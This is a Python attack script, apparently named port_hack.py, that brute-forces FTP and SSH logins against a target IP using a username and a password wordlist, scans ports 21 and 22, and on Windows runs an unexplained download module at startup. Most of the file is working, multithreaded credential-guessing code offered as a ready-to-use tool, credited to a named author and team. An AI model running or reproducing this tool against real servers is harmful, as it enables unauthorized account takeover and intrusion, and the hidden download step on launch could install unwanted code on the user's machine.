# library :

import ftplib
from sys import argv
import ban
import sys
import os
import paramiko
import socket
from colorama import init, Fore
import download_port_hack
import threading
import time

##############################################
# clear :

clear = sys.platform

if clear == 'linux':
    os.system('clear')

elif clear == 'windows':
    os.system('cls')
    download_port_hack.down() # download for windows

else:
    os.system('clear')
###############################################

# help :
if argv[1] == '-h' :
    print('''
first options :

    -s  |    SSH guess
    -p  |    PORT scan ( 21 , 22 )
    -f  |    FTP guess
    -m  |    SMTP guess
===================================
second options :
    
    -i  |    ip target 
    -u  |    username 
    -l  |    list password 
===================================
   [ ftp or ssh ( -f or -s or -p ) ] , [ ip ( -i ) ] , [ username( -u ) ] , [ list ( -l ) ]

    make by : @d_5tr
    team : @zer0one_01
    ''')
####################################

# FTP GUESS :
if argv[1] == '-f':
    def ftps(file):
        try:
            global running
            running += 1
        except:
            running = 0
        try:
            ftp_login = ftplib.FTP(argv[3], argv[5], file)
            print(f'[{Fore.GREEN}+{Fore.WHITE}] Found password :')
            print(f'[{Fore.GREEN}+{Fore.WHITE}] username :', argv[5])
            print(f'[{Fore.GREEN}+{Fore.WHITE}] password : ', file)
            exit()
        except:
            print(f'[{Fore.RED}-{Fore.WHITE}] Not Found !!', argv[5], " : ", file)
        running -= 1


    lines = 0

    for line in open(argv[7], 'r').readlines():
        lines += 1

    print(lines)

    x0f = open(argv[7]).readlines()
    running = 0
    max = 20
    for file in x0f:
        file = str(file).strip()
        if running < max:
            x = threading.Thread(target=ftps, args=(file,))
            x.start()
        else:
            time.sleep(.1)




#####################################

# PORT SCAN :
elif argv[1] == '-p':
    ban.h8o8()

    if clear == 'linux' :
        os.system(f'./port_scan.sh {argv[2]}')

    else:

        host = argv[3]
        numberx = 0
        try:
            for port in range(21, 23):
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                socket.setdefaulttimeout(1)
                result = s.connect_ex((host, port))  # scan

                if result == 0:
                    def non():
                        print('------------------------------')


                    name_port = socket.getservbyport(port)  # get name port
                    print(f"[{Fore.GREEN}+{Fore.WHITE}] port {port} / {name_port} open  ")
                    non()

        except:
            print(f'[{Fore.RED}-{Fore.WHITE}] port {port} / {name_port} close ')

########################################

# SSH GUESS :
elif argv[1] == '-s' :
    ban.h8o8()
    GREEN = Fore.GREEN
    RED = Fore.RED
    RESET = Fore.RESET
    BLUE = Fore.BLUE


    def is_ssh_open(hostname, user, password):

        client = paramiko.SSHClient()

        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            client.connect(hostname=hostname, username=user, password=password, timeout=3)
        except socket.timeout:
            print(f"{RED}[!] Host: {hostname} is unreachable, timed out.{RESET}")
            return False
        except paramiko.AuthenticationException:
            print(f"[{RED}!{Fore.WHITE}] Not  {user}:{password}")
            return False
        except paramiko.SSHException:
            print(f"{BLUE}[*] Quota exceeded, retrying with delay...{RESET}")
            time.sleep(60)
            return is_ssh_open(hostname, user, password)
        else:
            # connection was established successfully
            print(f"{GREEN}[+] Found :\n\tHOSTNAME: {hostname}\n\tUSERNAME: {user}\n\tPASSWORD: {password}{RESET}")
            return

    file = open(argv[7], 'r').readlines()
    for files in file :
        files = str(files).strip()

        is_ssh_open(argv[3], argv[5], files)

############################





############################

# Error :
else:
    print('''
    Error !!
    
        use : python3 port_hack.py -h for help 
    ''')



